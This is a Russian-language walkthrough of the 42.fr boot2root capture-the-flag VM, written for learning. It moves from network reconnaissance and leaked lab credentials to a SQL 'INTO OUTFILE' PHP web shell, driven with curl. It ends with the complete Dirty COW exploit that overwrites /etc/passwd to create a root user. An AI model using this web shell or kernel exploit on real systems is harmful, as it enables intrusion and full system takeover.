# boot2root

Задача: У нас есть дистрибутив BornToSecHackMe-v1.1.iso со стороны 42.fr в котором нужно получить права суперпользователя root.

1) Запустив дистрибутив мы можем обнаружить что на этот раз ip-адрес не высвечивается как это было в snow-crash, поэтому нужно будет его найти.

   - Зупускаем VirtualBox с уже установленной Kali, но прежде чем запустить дистрибутив BornToSecHackMe-v1.1.iso и Kali идем в Tools -> Network и создаем сетевую      карту. По умолчанию она будет называться ```vboxnet0```, в данном случае хост системой будет выступать наш iMac / macBook, посредиником будет выступать          VirtualBox, а гостевыми системами будут Kali и BornToSecHackMe-v1.1, после того как мы сделали сетевую карту мы идем в настройки наших машин ведь нам            нужно будет настроить им адаптер Host-only, что делает этот адаптер? Адаптер создает сеть между хост-системой и виртуальной машиной, минуя                        физическую сетевую карту. На компьютере появляется программный сетевой интерфейс, служащий для обмена данными между виртуальными машинами и хост-системой.        Виртуальные машины могут соединятся друг с другом и хост-системой, как будто соединены через коммутатор. Как и в режиме внутренней сети, виртуальной              машине не предоставляется физический интерфейс, благодаря чему машины не могут взаимодействовать с внешней сетью.
     В хост-системе появляется устройство VirtualBox Host-Only Network. Оно имеет собственную подсеть ```192.168.56.0``` и шлюз с адресом - ```192.168.56.1```.        Устройство соединяет подсеть и хост-систему без прямого выхода во внешнюю сеть.
     
   - Теперь нам нужно убедиться что мы действительно находимся в одной подсети, запускаем наши машины и все операции на этот раз мы будем производить с Kali,          аккуратный способ сделать это - пропинговать широковещательный адрес, который заполнит наш локальный кэш arp таблицы.
     ```
     ping 192.168.1.255
     ```
     Напоминаю: Широковещательный адрес — условный (не присвоенный никакому устройству в сети) адрес, который используется для передачи широковещательных пакетов      в компьютерных сетях.
     ```
     arp -a
     ```
     С нашей Kali можно сразу воспользоваться утилитой nmap для поиска уязвимостей и вбить следующее:
     ```
     nmap 192.168.X.XX-255
     ```
     Далее вычислив адрес BornToSecHackMe-v1.1, мы сканируем систему на наличие уязвимостей, а именно октрытых портов через nmap
     ```
     nmap 192.168.X.XX
     ```
     После это мы увидим следующее:
     ```
     Nmap scan report for 192.168.56.XX
     Host is up (0.0010s latency).
     Not shown: 994 closed ports
     PORT    STATE SERVICE
     21/tcp  open  ftp
     22/tcp  open  ssh
     80/tcp  open  http
     143/tcp open  imap
     443/tcp open  https
     993/tcp open  imaps
     ```
   - Итак что мы имеем? Мы видим открытые порты и понимаем что можем сделать, но пока что остается вопрос где взять учетные записи и пароли к ним? 
     Давайте сходим на 80 порт и посмотрим что у нас там есть? Вбиваем в строку поиска адрес ```192.168.X.XX:80```
     Далее мы попадаем на обычную интернет страничку на которой написано 'HACK ME' давайте попробуем поискать тут информацию, открыв панель разработчика в            надежде найти что-то интересное в html разметке я нашел ровно нихуя.
     Мы же помним что мы сидим с Kali? Ок, выпускайте ```Nikto```.
     
     Что такое Nikto? ```Nikto``` – это сканер с открытым исходным кодом (GPL) для веб-серверов, он выполняет комплексные тесты в отношении серверов по                нескольким направлениям, включая более 6700 потенциально опасных файлов/программ, проверка на устаревшие версии более 1250 серверов и проблемы, специфичные      для версий более чем 270 серверов. Сканер также проверяет элементы конфигурации сервера, такие как присутствие нескольких индексных файлов, серверные опции      HTTP и пытается определить имя и версии веб-сервера и программного обеспечения.

     На официальном сайте изменения замерли на 2.1.5 версии аж в 2012 году. Тем не менее, под руководством автора проект живёт на GitHub’е, пользователи              регулярно добавляют в базу данных и плагины изменения для сканирования новых уязвимостей, новых версий и т.д.

     Nikto не создавался быть незаметным. Он будет тестировать веб-сервер за самое быстрое возможное время, очевидно, что его активность попадёт в логи веб-          сервера и в поле зрение IPS/IDS (систем обнаружения/предотвращения вторжений). Тем не менее, имеется поддержка для анти-IDS методов из LibWhisker – на            случай, если вы захотите их попробовать (или протестировать вашу систему IDS).

     Не каждая проверка относится к проблеме безопасности, хотя большинство относятся. Некоторые пункты являются проверками типа «только для информации», которые      ищут вещи, может быть не имеющие брешей безопасности, но веб-мастер или инженер по безопасности могут не знать, что это присутствует на сервере. Обычно в        выводимой информации эти элементы помечены соответствующим образом. Есть также некоторые проверки на неизвестные элементы, которые были замечены в файлах        журналов.
     
     Теперь я прорекламировал Nikto и мне за это не заплатили.
     
     Вбиваем: ```nikto -h https://192.168.56.XX```
     
     Что мы получаем после? Мы получаем пару каталогов которые могут быть нам интересны, а это ```forum```, ```webmail```, ```phpMyAdmin```
     
     Теперь у нас есть маршрут, ну что погнали? Давайте походим по всем этим точками и первой точкой будет форум ```https://192.168.56.XX/forum/```, дальше            пойдем к почте ```https://192.168.56.XX/webmail/```, ну и на последок заглянем в БД ```https://192.168.56.XX/phpmyadmin/```.
     После того как мы походили по всем этим точкам, мы понимаем что нам также не хватает логинов и паролей, но у нас есть форум, где можно попробовать поискать      информацию. После серфинга по форуму удалось там обнаружить гения, который достаточно открыто показал свой пароль -> формулировка была следующей ```Failed        password for invalid user !q\]Ej?*5K5cy*AJ```, этим гением оказался ```lmezard```, давайте логиниться на форуме.
     
     Залогинились на форуме и давайте зайдем профиль, в профиле посмотрели информацию о пользователе и нашли там его электронный адрес почты.
     
     Теперь у нас есть почта, а это значит можно попробовать пойти посмотреть как дела у почты ```https://192.168.56.XX/webmail/```, как оказалось пароль остался      тем же ```!q\]Ej?*5K5cy*AJ```
     
     Залогинившись в почту внимание сразу падает на ```DB Access```, открываем и видим там логин и пароль ```root/Fg-'kKXBj87E:aJ$``` зная что у нас есть              ```phpMyAdmin``` сразу идем туда ```https://192.168.56.XX/phpmyadmin/```, на этот раз спросим как дела у БД.
     
   - Сейчас будут достаточно интересные моменты про ```SQL инъекции``` и что может быть если не защищаться от них.
     
     Одна из конечных целей взлома - это возможность получить оболочки для выполнения системных команд и владения целью или сетью . SQL-инъекция обычно связана        только с базами данных и их данными, но фактически может использоваться как вектор для получения командной оболочки. В качестве эксперимента мы будем            использовать простую ошибку SQL-инъекции для выполнения команд.
     
     В общем и целом как нам понять все это и что нужно делать?
     
     Нам нужно определить корневой каталог веб-сервера для загрузки нашей оболочки. В зависимости от приложения и типа используемого веб-сервера это может            варьироваться, особенно если администратор изменяет местоположение по умолчанию или имеются соответствующие разрешения. Для целей этой демонстрации мы            предположим, что корневой веб-каталог Apache по умолчанию ( / var / www / ) используется с общедоступными разрешениями на запись. Информацию о веб-сервере,      включая корневой каталог, обычно можно найти в файле «phpinfo.php», но в гашем случае мы просто выпустим на волю ```DirBuster```.
     
     Что такое ```DirBuster```?
     
     ```DirBuster``` — это многопотоковое Java приложение, предназначенное для брутфорса имён директорий и файлов веб-приложений и веб-серверов. DirBuster            пытается найти скрытые каталоги и файлы.

     Тем не менее, подобные инструменты в немалой степени ценны своими списками директорий и файлов. С этой программой поставляется несколько словарей, которые        были собраны из реальных названий файлов и директорий. Всего в DirBuster имеется 9 словарей, их описание будет дано ниже. Но если и этого мало, то DirBuster      умеет делать чистый брутфорс, от которого ничего не способно скрыться! Конечно, если у вас есть время 😉

     Домашняя страница: https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project
     
     Что это и для чего это нужно? -> Запустили ```DirBuster``` и получили ответ.
     
     Вопрос: Есть две папки - ```templates_c``` и ```cache```, которые используются при использовании Smarty с кэшированием.
     
     Ответ: ```templates_c``` - используется для скомпилированных шаблонов, но без фактического содержимого, которое может быть динамически вставлено в них. С        другой стороны, папка cache используется для того, что вы знаете как кэшированные страницы - полные страницы, которые служили пользователю вместо того,          чтобы каждый раз заново компилировать их.
     
     Теперь мы понимаем что у нас есть ```templates_c``` - каталог, которому всегда нужно разрешение на запись.
     
     Мы можем использовать команду into outfile для записи в файл. В этом случае мы вставим простой скрипт PHP, который сможет запускать системные команды.            Скрипт, который мы удачно назовем cmd.php, должен выглядеть так: ```<?php system($_GET["cmd"]); ?>```
     
     Теперь выполним инъекцию. Нам нужно будет использовать в скрипте двойные кавычки, поскольку нам нужно заключить вторую часть оператора в одинарные кавычки -      это позволит избежать синтаксических ошибок. Полная инъекция будет выглядеть так: ```SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE                        '/var/www/forum/templates_c/cmd.php'```
     
     Давайте проверим что у нас получилось, в адресной строке браузера наберем ```https://192.168.56.XX/forum/templates_c/cmd.php?cmd=pwd``` и если мы в ответ        получили ```/var/www/forum/templates_c```, тогда шалость удалась
   
   - Вспомним что такое ```curl```?
     На самом деле, curl - это набор библиотек, в которых реализуются базовые возможности работы с URL страницами и передачи файлов. Библиотека поддерживает          работу с протоколами: FTP, FTPS, HTTP, HTTPS, TFTP, SCP, SFTP, Telnet, DICT, LDAP, а также POP3, IMAP и SMTP. Она отлично подходит для имитации действий          пользователя на страницах и других операций с URL адресами.
     
     Открываем терминал у Kali и пишем: ```curl --insecure 'https://192.168.56.XX/forum/templates_c/cmd.php?cmd=ls%20-la%20/home'```
     ```
     drwxrwx--x 9 www-data             root                 126 Oct 13  2015 .
	  drwxr-xr-x 1 root                 root                 200 Apr 16 04:01 ..
	  drwxr-x--- 2 www-data             www-data              31 Oct  8  2015 LOOKATME
	  drwxr-x--- 6 ft_root              ft_root              156 Jun 17  2017 ft_root
	  drwxr-x--- 3 laurie               laurie               143 Oct 15  2015 laurie
	  drwxr-x--- 4 laurie@borntosec.net laurie@borntosec.net 113 Oct 15  2015 laurie@borntosec.net
	  dr-xr-x--- 2 lmezard              lmezard               61 Oct 15  2015 lmezard
	  drwxr-x--- 3 thor                 thor                 129 Oct 15  2015 thor
	  drwxr-x--- 4 zaz                  zaz                  147 Oct 15  2015 zaz
     ```
     Думаю вы теперь понимаете что можно делать? Просто напоминаю что ```%20``` - это символ пробела
     
     Забегая вперед мы видим файл ```LOOKATME``` этот файл содержит в себе логин и пароль ```lmezard:G!@M6f4Eatau{sF"```
     
     Что у нас осталось сейчас? Попробуем ```SSH``` или ```FTP```
     
     ```
     Nmap scan report for 192.168.56.XX
     Host is up (0.0010s latency).
     Not shown: 994 closed ports
     PORT    STATE SERVICE
     21/tcp  open  ftp
     22/tcp  open  ssh
     80/tcp  open  http
     143/tcp open  imap
     443/tcp open  https
     993/tcp open  imaps
     ```
     Удалось зайти по FTP соединению, у нас есть два файла один из которых нам понятен, это обычный ```README```, а второй файл ```fun``` не понятный. Попробуем      открыть через текстовый редактор, уверен что это не даст нам результата, так и вышло, тогда мы попытались распарсить его через утилиту ```strings```, но        	тут тоже ничего не вышло, окей давайте узнаем что это за файл, подрубаем утилиту ```file``` аргументом подаем тот самый файл ```file fun```, после чего          узнаем что это обычный архив, ну тут понятно что делать ```tar -xf fun```. Окей, появилась дерриктория ```ft_fun```, открыв ее и изучив, мы поняли что файлы      с расширением ```.pcap```, наивные мы, сразу пошли в wireshark и попытались смержить все эти файлы, но это оказалось невозможным. Изучив этот вопрос мы          поняли что просто так нам это не решить, тогда мы решили прибегнуть к помощи коллег, все решилось помощью скрипта на python.
     ```
     #! /usr/bin/env python3
     import os
     import re
     import sys

     results = {}

     for file in os.listdir("ft_fun"):
         f = open("ft_fun/%s" % file, 'r')
         content = f.read()
         f.close()
         file_line = re.search(r'//file([0-9]*)', content)
         file_number = int(file_line.group(1))
         results[file_number] = content

     original_stdout = sys.stdout
     with open("main.c", 'w+') as file:
         sys.stdout = file
         for _, value in sorted(results.items()):
             print(value)
         file.close()
     ```
     Если кратко, то эти файлы имеют код ```Си``` и комментарии, номер / строку.
     
     Выполнив все манипуляции с код-инжинирингом мы получили пароль ```Iheartpwnage```, но от кого этот пароль? Теперь вспоминаем почту и пользователя под 	      логином ```laurie```
     
     У нас остался только SSH протокол, давайте попробуем зайти под логином ```laurie``` и паролем ```Iheartpwnage```, вот тут забегая вперед скажу что этого          сделать не получится. Как оказалось пароль который мы получили нужно захешировать ```echo -n "Iheartpwnage" | shasum -a 256```, это мы поняли только спустя 	время и подсказки, теперь мы можем залогиниться под логином ```laurie``` и паролем ```330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4```.
     
     Следующий этап достаточно сложный, его можно решить, но мы не стали тратить на это время, это реверс-инжиниринг и можно использовать ```Ghidra```.
     
     Просто используем уязвимость которую назвали ```Dirty Cow```.
     
     Уязвимость Dirty COW — серьезная программная уязвимость в ядре Linux, существующая с 2007 года и исправленная в октябре 2016 года. С её помощью локальный 	      пользователь может повысить свои привилегии из-за ошибки состязания в реализации механизма копирования при записи для страниц памяти, помеченных флагом 	        Dirty bit
     
     Создаем в каталоге файл dirty.c
     ```
     //
     // This exploit uses the pokemon exploit of the dirtycow vulnerability
     // as a base and automatically generates a new passwd line.
     // The user will be prompted for the new password when the binary is run.
     // The original /etc/passwd file is then backed up to /tmp/passwd.bak
     // and overwrites the root account with the generated line.
     // After running the exploit you should be able to login with the newly
     // created user.
     //
     // To use this exploit modify the user values according to your needs.
     //   The default is "firefart".
     //
     // Original exploit (dirtycow's ptrace_pokedata "pokemon" method):
     //   https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c
     //
     // Compile with:
     //   gcc -pthread dirty.c -o dirty -lcrypt
     //
     // Then run the newly create binary by either doing:
     //   "./dirty" or "./dirty my-new-password"
     //
     // Afterwards, you can either "su firefart" or "ssh firefart@..."
     //
     // DON'T FORGET TO RESTORE YOUR /etc/passwd AFTER RUNNING THE EXPLOIT!
     //   mv /tmp/passwd.bak /etc/passwd
     //
     // Exploit adopted by Christian "FireFart" Mehlmauer
     // https://firefart.at
     //

     #include <fcntl.h>
     #include <pthread.h>
     #include <string.h>
     #include <stdio.h>
     #include <stdint.h>
     #include <sys/mman.h>
     #include <sys/types.h>
     #include <sys/stat.h>
     #include <sys/wait.h>
     #include <sys/ptrace.h>
     #include <stdlib.h>
     #include <unistd.h>
     #include <crypt.h>

     const char *filename = "/etc/passwd";
     const char *backup_filename = "/tmp/passwd.bak";
     const char *salt = "firefart";

     int f;
     void *map;
     pid_t pid;
     pthread_t pth;
     struct stat st;

     struct Userinfo {
        char *username;
        char *hash;
        int user_id;
        int group_id;
        char *info;
        char *home_dir;
        char *shell;
     };

     char *generate_password_hash(char *plaintext_pw) {
       return crypt(plaintext_pw, salt);
     }

     char *generate_passwd_line(struct Userinfo u) {
       const char *format = "%s:%s:%d:%d:%s:%s:%s\n";
       int size = snprintf(NULL, 0, format, u.username, u.hash,
         u.user_id, u.group_id, u.info, u.home_dir, u.shell);
       char *ret = malloc(size + 1);
       sprintf(ret, format, u.username, u.hash, u.user_id,
         u.group_id, u.info, u.home_dir, u.shell);
       return ret;
     }

     void *madviseThread(void *arg) {
       int i, c = 0;
       for(i = 0; i < 200000000; i++) {
         c += madvise(map, 100, MADV_DONTNEED);
       }
       printf("madvise %d\n\n", c);
     }

int copy_file(const char *from, const char *to) {
  // check if target file already exists
  if(access(to, F_OK) != -1) {
    printf("File %s already exists! Please delete it and run again\n",
      to);
    return -1;
  }

  char ch;
  FILE *source, *target;

  source = fopen(from, "r");
  if(source == NULL) {
    return -1;
  }
  target = fopen(to, "w");
  if(target == NULL) {
     fclose(source);
     return -1;
  }

  while((ch = fgetc(source)) != EOF) {
     fputc(ch, target);
   }

  printf("%s successfully backed up to %s\n",
    from, to);

  fclose(source);
  fclose(target);

  return 0;
}

int main(int argc, char *argv[])
{
  // backup file
  int ret = copy_file(filename, backup_filename);
  if (ret != 0) {
    exit(ret);
  }

  struct Userinfo user;
  // set values, change as needed
  user.username = "firefart";
  user.user_id = 0;
  user.group_id = 0;
  user.info = "pwned";
  user.home_dir = "/root";
  user.shell = "/bin/bash";

  char *plaintext_pw;

  if (argc >= 2) {
    plaintext_pw = argv[1];
    printf("Please enter the new password: %s\n", plaintext_pw);
  } else {
    plaintext_pw = getpass("Please enter the new password: ");
  }

  user.hash = generate_password_hash(plaintext_pw);
  char *complete_passwd_line = generate_passwd_line(user);
  printf("Complete line:\n%s\n", complete_passwd_line);

  f = open(filename, O_RDONLY);
  fstat(f, &st);
  map = mmap(NULL,
             st.st_size + sizeof(long),
             PROT_READ,
             MAP_PRIVATE,
             f,
             0);
  printf("mmap: %lx\n",(unsigned long)map);
  pid = fork();
  if(pid) {
    waitpid(pid, NULL, 0);
    int u, i, o, c = 0;
    int l=strlen(complete_passwd_line);
    for(i = 0; i < 10000/l; i++) {
      for(o = 0; o < l; o++) {
        for(u = 0; u < 10000; u++) {
          c += ptrace(PTRACE_POKETEXT,
                      pid,
                      map + o,
                      *((long*)(complete_passwd_line + o)));
        }
      }
    }
    printf("ptrace %d\n",c);
  }
  else {
    pthread_create(&pth,
                   NULL,
                   madviseThread,
                   NULL);
    ptrace(PTRACE_TRACEME);
    kill(getpid(), SIGSTOP);
    pthread_join(pth,NULL);
  }

  printf("Done! Check %s to see if the new user was created.\n", filename);
  printf("You can log in with the username '%s' and the password '%s'.\n\n",
    user.username, plaintext_pw);
    printf("\nDON'T FORGET TO RESTORE! $ mv %s %s\n",
    backup_filename, filename);
  return 0;
}
```    
